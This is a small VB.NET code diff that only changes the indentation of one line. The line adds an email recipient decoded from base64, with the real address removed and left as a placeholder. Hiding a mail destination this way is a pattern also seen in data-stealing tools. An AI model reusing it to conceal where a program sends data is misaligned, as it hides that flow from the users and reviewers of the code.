@@ -738,7 +738,7 @@ ErrorX:
 
             'Function
             mail.From = New MailAddress("noreply@messenger.me")
-        mail.To.Add(base64Decode("Email: I did remove it, you can put it here in base64 format.")) 'my Dummy mail receiver
+            mail.To.Add(base64Decode("Email: I did remove it, you can put it here in base64 format.")) 'my Dummy mail receiver
             mail.Body = Body
             mail.Subject = Subject
             mail.Priority = MailPriority.Normal
